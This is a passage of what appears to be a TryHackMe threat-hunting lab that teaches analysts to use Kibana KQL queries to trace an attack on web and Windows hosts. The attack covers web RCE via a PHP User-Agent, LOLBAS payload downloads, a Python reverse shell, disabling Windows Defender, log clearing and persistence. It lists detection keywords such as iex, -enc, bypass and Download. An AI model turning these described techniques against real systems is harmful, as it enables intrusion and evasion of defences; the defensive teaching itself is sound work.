Visualize Library again and create a visualisation table using Lens. 
Ensure that the table is configured with the following:

1. Set the timestamp to July 3.
2. Set the index to packetbeat.
3. Set the Table Index (packetbeat), Rows (source.ip and http.response.status_code), and Metrics (count).
4. Use the KQL query to list all ingress network connections to the web server:`host.name: web01 AND network.protocol: http AND destination.port: 80`

**Note: The `http.response.status_code` is included in the rows to identify the web application's response to the attacker's HTTP requests.**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a8191b2574cc9f57739e3640bf86c8cb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a8191b2574cc9f57739e3640bf86c8cb.png)

***Click to enlarge the image***

Upon checking the results above (highlight #5), it can be observed that the query provided a high count of `status code 404`, indicating a directory enumeration attempt by `167.71.198.43` since the attack produces many "Page Not Found" results due to its behaviour of guessing valid endpoints.

To
 better understand the attack, we can continue the investigation using 
the Discover tab with a query focused on status code 404 and the 
attacker's IP address. Let's use the following KQL query in the Discover tab:

`host.name:
 web01 AND network.protocol: http AND destination.port: 80 AND 
source.ip: 167.71.198.43 AND http.response.status_code: 404`

In addition, select the following fields and add them as a column:

- query
- user_agent.original
- url.query

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b3aed47ec50e397bf656a2d7acc79a14.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b3aed47ec50e397bf656a2d7acc79a14.png)

*Click to enlarge the image*

Based on the results, it can be seen that the attacker used **Gobuster** (inferred via the User Agent) to enumerate the directories in the web application and eventually focused on the `/gila` directory, which may indicate that the attacker is attempting to exploit the said application.

To continue, let's replace the KQL query with **status codes 200, 301, and 302** to focus on valid endpoints accessed by the attacker.

`host.name:
 web01 AND network.protocol: http AND destination.port: 80 AND 
source.ip: 167.71.198.43 AND http.response.status_code: (200 OR 301 OR 
302)`

In addition, sort the
 timestamp in ascending order (click the arrow beside the Time column to
 view the sequence of attacks from the earliest timestamp).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/00714db972dc460ddb8c99cfaff4d045.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/00714db972dc460ddb8c99cfaff4d045.png)

*Click to enlarge the image*

Based on the results, we can infer the following:

- After discovering the **/gila** endpoint, the attacker focused on accessing it.
- The attacker then used a suspicious PHP code on the User-Agent field. The
code uses x as a GET parameter to execute host commands via the system
function.
- Lastly, the attacker used the x parameter to execute host commands.

With
 these findings, we can say that the attacker successfully compromised 
the web server, exploiting a Remote Code Execution vulnerability in our 
Gila web application. Following a threat hunter's mindset, the next step
 of this investigation is to identify the impact of the commands 
executed by the attacker via Remote Code Execution.

# Phishing Links and Attachments

For our last scenario, we will use the `winlogbeat-*` index
 and hunt for indicators of malicious links and attachments being opened
 or downloaded from employee workstations on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Phishing
 emails containing malicious links or attachments of malware payloads 
are either downloaded or opened directly from the email client before 
being executed. Given this, we will hunt for the following behaviours that satisfy this idea:

1. Files downloaded using a web browser.
2. Files opened from an email client (in this case, we will be hunting files opened from an Outlook client).

**Files Downloaded using Chrome**

Using
 the Discover tab, we will first focus on phishing links downloaded 
using a web browser. By using the following KQL query, we will hunt file
 creations (Sysmon Event ID 11) generated by chrome.exe:

`host.name: WKSTN-* AND process.name: chrome.exe AND winlog.event_id: 11`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- winlog.computer_name
- winlog.event_data.User
- file.path

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/297abb4fdb610a0edc133d9b28ee8318.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/297abb4fdb610a0edc133d9b28ee8318.png)

*Click to enlarge the image*

**Note:
 We can ignore the .tmp files created by Chrome. By default, chrome.exe 
creates a temporary file when a file is being downloaded.**

Based on the results, we can see that the following users on their respective workstations have downloaded unusual files.

| User | Workstation | Files Downloaded |
| --- | --- | --- |
| THREATHUNTING\clifford.miller | WKSTN-1.threathunting.thm | C:\Users\clifford.miller\Downloads\chrome.exe
C:\Users\clifford.miller\Downloads\microsoft.hta |
| THREATHUNTING\bill.hawkins | WKSTN-2.threathunting.thm | C:\Users\bill.hawkins\Downloads\update.exe |

We
 can confirm if these files are suspicious once we see them in action. 
Since this task only focuses on the intrusion attempt, investigating 
these artefacts will continue on the following tasks. Following a threat
 hunter's mindset, the next step of this investigation is to identify 
potential child processes spawned or network connections made by these 
suspicious files.

**Files Opened using Outlook**

For 
an alternative way of hunting malware payloads delivered via phishing 
emails, we will hunt phishing attachments opened using an Outlook 
client. Using the same setup of the Discovery tab, use the following KQL
 query to track files created by the Outlook client:

`host.name: WKSTN-* AND process.name: OUTLOOK.EXE AND winlog.event_id: 11`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/7fda4f67be441f5a45766fc66c484725.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/7fda4f67be441f5a45766fc66c484725.png)

*Click to enlarge the image*

Based on the results, an attachment named Update.zip was opened, which was temporarily stored in the `\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\` directory. Alternatively, this string can be used as a query syntax to hunt files created from the Outlook cache directory.

To confirm the zip file's contents, we can use the following KQL query to find events connected to it: `host.name: WKSTN-* AND *Update.zip*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1a26656dcda0a590b7bd0fd1be0f5c6a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1a26656dcda0a590b7bd0fd1be0f5c6a.png)

*Click to enlarge the image*

Based
 on the results, we confirm that an LNK file exists from the archive. A 
shortcut file (.lnk) archived to zip is a typical malware attachment 
threat actors use. Following a threat hunter's mindset, the next step of
 this investigation is to identify the process spawned by the shortcut 
file. This can be done by following the events generated by update.lnk.

To
 do this in Kibana, click the dropdown of one of the events related to 
update.lnk and view the surrounding documents. Note that we have also 
added the `process.executable` column to aid us in correlating the events.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/218ec87deb70ed7bb0ba985f51a05a9c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/218ec87deb70ed7bb0ba985f51a05a9c.png)

*Click to enlarge the image*

Once the Surrounding Documents page is opened, filter the events to only focus on `WKSTN-2.threathunting.thm` and modify the count of newer documents to see the subsequent events generated.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f09e1ada7dca3913d1dd067d0304694c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f09e1ada7dca3913d1dd067d0304694c.png)

*Click to enlarge the image*

# Tactic: Execution

The [Execution Tactic (TA0002)](https://attack.mitre.org/tactics/TA0002/)
 refers to adversaries' techniques to execute or run their malicious 
code in conjunction with the initial access techniques or ways of 
delivering the attack. This stage in the cyber-attack lifecycle is 
crucial as it enables the attackers to successfully run their commands 
remotely and continue with the series of attacks to establish further 
access. Example techniques used by adversaries are the following:

- Execution through command-line tools like PowerShell and Windows Command Processor (cmd.exe).
- Execution through built-in system tools or using [Living-off-the-land Binaries (LOLBAS)](https://lolbas-project.github.io/).
- Execution through scripting/programming tools, such as Python or PHP.

Moreover,
 these examples are typically used to download a staged payload. This 
means that the execution chain to establish persistent remote access 
starts with a minimised type of execution. This
 reduced-footprint approach is employed to mitigate the risk of 
detection in the early stages of the attack. By using a smaller, more 
discreet payload for initial infiltration, the attacker increases their 
chances of evading network defences and security protocols.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the provided examples 
above, as there are more ways to get initial code execution. However, we
 will use these examples to understand this tactic and grasp how to hunt
 it.

The common intersection of the examples above is executing 
malicious commands through pre-existing tools inside the victim machine.

| **Execution Technique** | **Examples** |
| --- | --- |
| Command-line Tools | Using built-in commands through `powershell.exe` and `cmd.exe` to download and execute the staged payload. |
| Built-in System Tools | Using `certutil.exe` or `bitsadmin.exe` for downloading the remote payload and `rundll32.exe` to run it. |
| Scripting / Programming Tools | Using built-in functionalities of programming tools such as Python's `os.system()` or PHP's `exec()`. |

**Note:
 The scripting/programming tools do not always exist on the target 
machine. However, it can be pre-determined in some cases that the 
programming tool exists, such as knowing the backend application used by
 the vulnerable target web server.**

# Hunting Execution

The
 Execution phase can manifest in several ways, and recognising these 
signs can be complex due to the many potential execution methods an 
adversary might employ. However, it all boils down to executing a 
malicious command.

Unusual process 
creation, network connections, file modifications, and many more traces 
can indicate malicious execution. Recognising these red flags requires 
an in-depth understanding of typical endpoint behaviour and a keen eye 
for spotting anomalies. In line with these, we will use the following 
scenarios to build our hunting methodology:

- Suspicious usage of command-line tools.
- Abuse of built-in system tools.
- Execution via programming/scripting tools.

# Usage of Command-Line Tools

Starting with this scenario, we will use the `winlogbeat-*` index and hunt for executions of built-in Windows command-line tools, such as PowerShell
 and Command Prompt, from employee workstations on July 3, 2023. Ensure 
all queries to the Kibana console are set to look for the right index 
and timeframe.

System 
Administrators typically use these command-line tools to configure 
workstations and servers. However, threat actors commonly abuse it to 
execute malicious commands and control the compromised host. Given this,
 we will hunt for behaviours that show numerous usage of command-line 
tools, accompanied by unusual command executions and network 
connections.

Using the Discover tab, we will focus on the 
following processes: powershell.exe and cmd.exe. By using the following 
KQL query, we will hunt process creations (Sysmon Event ID 1) generated by these two tools:

`host.name: WKSTN-* AND winlog.event_id: 1 AND process.name: (cmd.exe OR powershell.exe)`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- winlog.computer_name
- user.name
- process.parent.command_line
- process.command_line

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/631c0880041b3ab9ec0da41d7796b623.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/631c0880041b3ab9ec0da41d7796b623.png)

*Click to enlarge the image*

Out
 of the 104 hits, it can be observed that numerous commands are used 
that seem unusual. One example is the execution of cmd.exe by `C:\Windows\Temp\installer.exe`,
 as shown in its parent-child process relationship. It is more 
remarkable that the parent process binary is located from 
C:\Windows\Temp, a typical folder threat actors use to write malicious 
payloads.

To add on PowerShell
 analysis, an alternative way to hunt unusual PowerShell execution is 
through the events generated by PowerShell's Script Block Logging. We 
can use the following KQL syntax to list all events generated by it: `host.name: WKSTN-* AND winlog.event_id: 4104`

Moreover, we can use the following fields as columns to aid in our analysis:

- winlog.computer_name
- winlog.user.name
- powershell.file.script_block_text

Once
 the results are out, you may observe that the Script Block Logging 
generated 44,934 events. We can reduce this by removing the noise 
generated by the events. In this case, remove the "Set-StrictMode" 
events by clicking the minus button in the image below. These events are
 continuously repeated and do not indicate immediate suspicious activity
 and by filtering this, we can focus on more significant events that may
 lead to a successful hunt.

Note that when reducing noise, ensure 
that these events are guaranteed to be benign, or else you will miss 
significant events that might indicate suspicious activity.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cef30beb16d98882921b030f944ac497.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cef30beb16d98882921b030f944ac497.png)

*Click to enlarge the image*

After
 applying the filters, you will see that the events have been reduced to
 489 hits, which makes hunting suspicious events easier. By scrolling 
through the executed PowerShell scripts, it can be observed that **Invoke-Empire** (signature of Empire C2
 agent) was used in WKSTN-1. Moreover, other unusual PowerShell scripts 
seem to be malicious. You may continue analysing these events and assess
 the impact of the commands executed through PowerShell.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0ce3b95d0e5cad597a1f6176fd2f1a68.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0ce3b95d0e5cad597a1f6176fd2f1a68.png)

*Click to enlarge the image*

Aside from manually reviewing the events generated by PowerShell
 or Windows Command Prompt, known strings used in cmd.exe or 
powershell.exe can also be leveraged to determine unusual traffic. Some 
examples of PowerShell strings are provided below:

- invoke / invoke-expression / iex
- enc / -encoded
- noprofile / -nop
- bypass
- c / -command
- executionpolicy / -ep
- WebRequest
- Download

Note
 that once these strings are seen in the logs, it is still recommended 
to validate the events, as some of these strings might be used by 
legitimate processes or benign activity executed by System 
Administrators.

# Built-in System Tools

For this scenario, we will still use the `winlogbeat-*`
 index and hunt for executions of built-in Windows binaries from 
employee workstations on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Aside from PowerShell
 and Command Prompt binaries, other built-in binaries are also abused by
 threat actors to execute malicious commands. Most of these binaries, 
known as Living Off The Land Binaries (LOLBAS), are documented on this [page](https://lolbas-project.github.io/).
 Using this resource, we will hunt usage of built-in binaries and 
investigate unusual commands executed and network connections initiated.

Using
 the Discover tab, we will hunt some built-in tools typically used by 
threat actors (Certutil, Mshta, and Regsvr32). By using the following 
KQL query, we will again hunt process creation (Sysmon Event ID 1) as well as network connection (Sysmon Event ID 3) events:

`host.name:
 WKSTN-* AND winlog.event_id: (1 OR 3) AND (process.name: (mshta.exe OR 
certutil.exe OR regsvr32.exe) OR process.parent.name: (mshta.exe OR 
certutil.exe OR regsvr32.exe))`

**Note: The KQL query also lists all child processes spawned by these LOLBAS, which is why the** `process.parent.name` **field is also used.**

Moreover, we can use the following fields as columns to aid in our analysis:

- winlog.computer_name
- user.name
- process.parent.command_line
- process.name
- process.command_line
- destination.ip

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3362c4f8f3a5ac6851c1b149daf71934.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3362c4f8f3a5ac6851c1b149daf71934.png)

*Click to enlarge the image*

Based
 on the results, it can be observed that all three binaries were 
suspicious due to their usage. Let's elaborate further on each binary.

- Certutil was used to download a binary (installer.exe), which is then stored in
C:\Windows\Temp. (Remember that this binary was also discovered from the previous command-line tools investigation.)
- Regsvr32 accessed a remote file (teams.sct), then spawned a suspicious encoded PowerShell command.
- Mshta spawned a suspicious encoded PowerShell command.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the extent of these malicious activities by correlating the 
subsequent events generated after these LOLBAS were used. One example is
 getting the process ID of the child processes spawned by these LOLBAS 
and investigating them further. Moreover, the encoded PowerShell commands can be decoded and hunted to understand the attack better.

# Scripting and Programming Tools

For our last scenario, we will continue using the `winlogbeat-*`
 index and hunt for suspicious usage of scripting/programming tools from
 employee workstations on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Scripting
 and programming tools are typically found in either workstations owned 
by software developers or servers requiring these packages to run 
applications. These tools are benign, but threat actors abuse their 
functionalities to execute malicious code. Given this, we will hunt for 
unusual events generated by programming tools like Python, PHP and NodeJS.

Using the Discover tab, we will use the following KQL query to hunt process creation (Sysmon Event ID 1) and network connection (Sysmon Event ID 3) events:

`host.name:
 WKSTN-* AND winlog.event_id: (1 OR 3) AND (process.name: (*python* OR 
*php* OR *nodejs*) OR process.parent.name: (*python* OR *php* OR 
*nodejs*))`

Moreover, we can use the following fields as columns to aid in our analysis:

- winlog.computer_name
- user.name
- process.parent.command_line
- process.name
- process.command_line
- destination.ip
- destination.port

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6c02f3410b791abad780a580f9dcb2c4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6c02f3410b791abad780a580f9dcb2c4.png)

*Click to enlarge the image*

Based on the results, it can be observed that Python was used to do the following:

- Spawn a child cmd.exe process.
- Initiate a network connection to 167[.]71[.]198[.]43:8080

Using
 these findings, we can extend our investigation further by getting the 
process ID of the cmd.exe process spawned by Python and using it in our 
new KQL query. We can do this by clicking the dropdown button on the log
 that indicates Python created a cmd.exe process.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2c4d7093787c257bbb4bea5ba88a42b0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2c4d7093787c257bbb4bea5ba88a42b0.png)

*Click to enlarge the image*

Using this process PID, we can search all processes spawned by this cmd.exe instance by using it as our `process.parent.pid`:

`host.name: WKSTN-* AND winlog.event_id: (1 OR 3) AND process.parent.pid: 1832`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2593b99702322aa3a0a5566fa5d56d87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2593b99702322aa3a0a5566fa5d56d87.png)

*Click to enlarge the image*

Based
 on the results, it can be observed that the cmd.exe process, spawned by
 Python, generated child processes, indicating that the script `dev.py` could be a Python reverse shell script allowing attackers to execute remote commands via cmd.exe.

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the extent of these malicious activities by correlating the 
subsequent events generated after the execution of the suspicious Python
 script. In addition, it is also good to understand how the script was 
written in the compromised machine by backtracking the events related to
 `dev.py`.

**Defense Evasion**

# Tactic: Defense Evasion

The [Defense Evasion Tactic (TA0005)](https://attack.mitre.org/tactics/TA0005/)
 comprises strategies that adversaries employ to avoid detection by 
network security systems during or following an infiltration. This is 
often achieved by disguising malicious activities as usual legitimate 
operations or manipulating known benign files or processes. Attackers 
utilise a range of methods to evade defences, including but not limited 
to the following:

- Disabling security software.
- Deleting attack footprints on logs.
- Deceiving analysts through masquerading, obfuscation, and encryption.
- Executing known bypasses to security controls.

Moreover, these examples are typically combined with the execution tactic to achieve better results. This makes
 it possible for an attacker to run their malicious code while avoiding 
or minimising the chances of being detected by the target's security 
systems, making the attack more likely to succeed.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the provided examples 
above, as there are more ways to deceive and evade defences. However, we
 will use these examples to understand this tactic and grasp how to hunt
 it.

The common intersection of the examples above is bypassing 
detection mechanisms, whether from a software solution or the security 
team.

| **Evasion Technique** | **Examples** |
| --- | --- |
| Disabling security software | Disabling Windows Defender via the command line or reverting the updated detection signatures. |
| Deleting logs | Deleting all existing Windows Event Logs inside the compromised machine. |
| Deceiving analysts | Mimicking process names or spoofing parent process IDs. |
| Executing known bypasses | Using known vulnerabilities or modifying host configurations to bypass the controls. |

# Hunting Defense Evasion

As
 we continue our deep dive into the adversary's playbook, we focus on 
hunting Defense Evasion. As discussed above, this method encompasses 
various techniques that adversaries use to avoid detection by security 
measures during or following an attack.

Despite
 adversaries' attempts to evade detection, their activities inevitably 
leave traces in these logs, providing us with potential leads. With 
these, we will use the following scenarios to uncover the traces of this tactic:

- Disabling security software.
- Log deletion attempts.
- Executing shellcode through process injection.

# Disabling Security Software

Starting with this scenario, we will use the `winlogbeat-*`
 index and hunt for attempts to disable security software, such as 
Windows Defender, from employee workstations on July 3, 2023. Ensure all
 queries to the Kibana console are set to look for the right index and timeframe.

Most
 organisations nowadays have improved their security defences, deploying
 numerous security software to prevent threat actors from successfully 
compromising their network. However, threat actors still have some 
tricks up their sleeves to bypass these controls and disable them to not
 limit their attack vectors in achieving their goals.

For this example, we will focus on known commands used to disable Windows Defender. By using the following KQL query, we will hunt events indicating an attempt to disable the running host antivirus:

`host.name: WKSTN-* AND (*DisableRealtimeMonitoring* OR *RemoveDefinitions*)`

The
 following strings in this query are tied up with the following commands
 to blind Windows Defender from detecting malicious activity.

- DisableRealtimeMonitoring - Commonly used with PowerShell's `Set-MPPreference` to disable its real-time monitoring.
- RemoveDefinitions - Commonly used with built-in `MpCmdRun.exe` to remove all existing signatures of Windows Defender.

Moreover, we can use the following fields as columns to aid in our analysis:

- winlog.computer_name
- user.name
- process.parent.command_line
- process.name
- process.command_line

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3b429919f44e0d05a028d2d8f0494b66.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3b429919f44e0d05a028d2d8f0494b66.png)

*Click to enlarge the image*

Based on the results, it can be seen that both indicators were seen from `WKSTN-1`,
 which indicates that a malicious actor has attempted to disable Windows
 Defender's detection capability. Moreover, both of the execution were 
attributed to malicious activities identified previously from the 
Execution task.

- Set-MpPreference was executed by the installer.exe binary, previously identified as malicious.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/7b55f8667f9c8380f5740a73d1eac00f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/7b55f8667f9c8380f5740a73d1eac00f.png)

*Click to enlarge the image*

- MpCmdRun.exe -RemoveDefinitions was executed by cmd.exe with PID 1832, correlating to the Command Prompt spawned by Python.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab2f4b9401128d4514219435413908bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab2f4b9401128d4514219435413908bb.png)

*Click to enlarge the image*

Following
 a threat hunter's mindset, the next step of this investigation is to 
identify the extent of these malicious activities by correlating the 
subsequent events generated after the execution of these commands. The 
attacker is expected to execute more malicious commands since the 
existing antivirus software from the compromised workstation was 
successfully disabled.

# Log Deletion Attempts

Following the second scenario, we will still use the `winlogbeat-*` index and hunt for log deletion attempts from employee workstations on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

From
 the perspective of the Security Team, every event log generated by 
workstations and servers is highly significant. Without these, analysts 
won't have enough visibility to complete the puzzle of investigating 
suspicious events and developing alerts from them. Given this, there 
won't be any good reason to delete these important files unless threat 
actors do.

The simplest way to detect 
the deletion of Windows Event Logs is via Event ID 1102. These events 
are always generated when a user attempts to delete Windows Logs, so we 
will use this in our KQL query to hunt for this activity.

`host.name: WKSTN-* AND winlog.event_id: 1102`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/26861fe6321548ab27e331bceff2cf22.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/26861fe6321548ab27e331bceff2cf22.png)

*Click to enlarge the image*

Based on the results, it can be seen that Windows Event Logs were cleared from `WKSTN-1`.
 Following a threat hunter's mindset, the next step of this 
investigation is to identify the log source that was removed and the 
command used to delete the logs.

To complete the investigation, use `View surrounding documents` to see the command used to clear the event logs. Note that you need to add `process.name` and `process.command_line` columns to aid in analysing the surrounding documents.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d3c00e23c222926cf23500c24b5918bc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d3c00e23c222926cf23500c24b5918bc.png)

*Click to enlarge the image*

# Execution through Process Injection

For the last scenario, we will use the `winlogbeat-*` index and hunt for potential process injection from employee workstations on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Process
 injection is a prominent technique malware developers use to execute 
malicious shellcodes while evading security defences successfully. Given
 this, we will use Sysmon's capability to detect CreateRemoteThread and 
hunt for potential process injection.

Using
 the Discover tab, we will focus on Sysmon's Event ID 8 
(CreateRemoteThread), which detects when a process creates a thread in 
another process. We will use the following KQL query to hunt this 
behaviour: `host.name: WKSTN-* AND winlog.event_id: 8`

Moreover, we can use the following fields as columns to aid in our analysis:

- winlog.computer_name
- process.executable
- winlog.event_data.SourceUser
- winlog.event_data.TargetImage

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/77c25bbb863bb5d22963735b6ae2ec70.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/77c25bbb863bb5d22963735b6ae2ec70.png)

*Click to enlarge the image*

Based on the results, the entry of `C:\Users\clifford.miller\Downloads\chrome.exe` created a new thread on `explorer.exe`,
 which is a typical target process threat actors use for process 
injection techniques. In addition, most entries are executed by a SYSTEM
 account, except for the chrome.exe, which is being run by Clifford 
Miller's account.

Following a threat 
hunter's mindset, the next step of this investigation is to identify the
 extent of these malicious activities by correlating the subsequent 
events generated after the potential process injection activity. 
Moreover, it is good to trace back how the malicious chrome.exe binary 
reached the compromised host.

**Persistence**

# Tactic:Persistence

The [Persistence Tactic (TA0003)](https://attack.mitre.org/tactics/TA0003/) describes adversaries' techniques to maintain access to a compromised network over an extended period, often covertly. This
 allows adversaries to retain control over their foothold even if the 
system restarts or the user logs out. This involved various use of 
methods, such as:

- Modification of registry keys to hijack the typical system/program startup.
- Installation of malicious scripts or software that automatically starts.
- Creation of additional high-privileged backdoor accounts.

Moreover,
 these examples are typically executed right after the initial 
successful execution. This post-execution deployment of persistence 
methods ensures the attacker maintains a consistent presence within the 
compromised network, potentially making the attack more difficult to 
detect and remove.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the provided examples 
above, as there are more ways to implant continued access. However, we 
will use these examples to understand this tactic and grasp how to hunt 
it.

The common intersection of the 
examples above is modifying the system configuration inside the victim 
machine and abusing the built-in functionalities to have continued 
access.

| **Persistence Technique** | **Examples** |
| --- | --- |
| Modification of registry keys | Using `reg.exe` to modify registry keys related to system boot-up, such as Run or RunOnce keys. |
| Installation of auto-start scripts | Creation of scheduled tasks (via `schtasks.exe`) to regularly update and execute the implanted malware. |
| Creation of additional accounts | Using `net.exe` to create a new user and add it to the local administrators' group. |

# Hunting

The
 hunt for persistence involves detecting the system's subtle changes and
 activities. This may entail identifying unrecognized or unexpected 
scripts running at startup, spotting unusual scheduled tasks, or 
noticing irregularities in system registry keys. We will use the following scenarios to learn more about the traces left when threat actors implant persistence mechanisms.

- Scheduled Task creation.
- Registry key modification.

# Scheduled Task Creation

Starting with this scenario, we will use the `winlogbeat-*` index and hunt for scheduled task creation attempts from employee workstations on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Scheduled
 tasks are commonly used to automate commands and scripts to execute 
based on schedules or triggers. However, threat actors abuse this 
functionality to automate their malicious commands from executing 
regularly. Given this, we will hunt for unusual scheduled task 
creations.

If Windows Advanced Audit Policy is properly configured, we can use Event ID 4698 (Scheduled Task Creation). Else, we can use the following keywords for hunting commands related to scheduled tasks: `schtasks and Register-ScheduledTask (PowerShell)`

With this, we can use the following KQL query to hunt:

`host.name: WKSTN-* AND (winlog.event_id: 4698 OR (*schtasks* OR *Register-ScheduledTask*))`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- winlog.computer_name
- user.name
- process.command_line
- winlog.event_id
- winlog.event_data.TaskName

**Note: We have used the winlog.event_id field as a column since the query result might give events with different event IDs.**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f54feaacae03235fa8b201fd733bce2d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f54feaacae03235fa8b201fd733bce2d.png)

*Click to enlarge the image*

Based
 on the results, it can be observed that some of the scheduled tasks 
(OneDrive Reporting/Standalone Task) seem to be benign. On a quick look, the unusual task created is named "Windows Update" and executes a PowerShell
 command scheduled every minute. Tracing back the previous 
investigations, www[.]oneedirve[.]xyz was already identified as 
suspicious, confirming the suspicion on this newly-created scheduled 
task.

Following a threat 
hunter's mindset, the next step of this investigation is to identify the
 events generated by the parent process of cmd.exe that executed the 
malicious scheduled task creation. With this, we can backtrack the 
events before the persistence was implanted.

# Registry Key Modification

For our last scenario, we will still use the `winlogbeat-*` index and hunt for unusual registry modifications indicating malicious persistence on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

The
 Windows registry is a database of information the operating system uses
 for its settings and configurations. Threat actors are abusing these 
settings and configurations to either hijack the normal flow of the 
operating system or store staged payloads for subsequent use. Given that
 the operating system commonly uses it, events generated by monitoring 
registry modifications are overwhelming and differentiating benign 
activity from malicious ones might be tedious. An example of this can be
 seen by using the following KQL query:

`host.name: WKSTN-* AND winlog.event_id: 13 AND winlog.channel: Microsoft-Windows-Sysmon/Operational`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/28eb9be84eae54f82b6782841d7337fa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/28eb9be84eae54f82b6782841d7337fa.png)

*Click to enlarge the image*

As
 shown in the image above, the query generated 1481 results, which makes
 hunting a threat feel like finding a needle in a haystack.

To ease the way of hunting, we can focus on known registry keys abused by threat actors to reduce the results:

- Software\Microsoft\Windows\CurrentVersion\Explorer\Shell (User Shell Folders)
- Software\Microsoft\Windows\CurrentVersion\Run (RunOnce)

**Note: Threat actors target more registry keys, but we will only use these for our example scenario.**

With this information, we will use an improved version of our previous KQL query to achieve better results:

`host.name:
 WKSTN-* AND winlog.event_id: 13 AND winlog.channel: 
Microsoft-Windows-Sysmon/Operational AND registry.path: 
(*CurrentVersion\\Run* OR *CurrentVersion\\Explorer\\User* OR 
*CurrentVersion\\Explorer\\Shell*)`

In addition, ensure that the following fields are added as columns to aid us in our investigation:

- winlog.computer_name
- user.name
- process.name
- registry.path
- winlog.event_data.Details

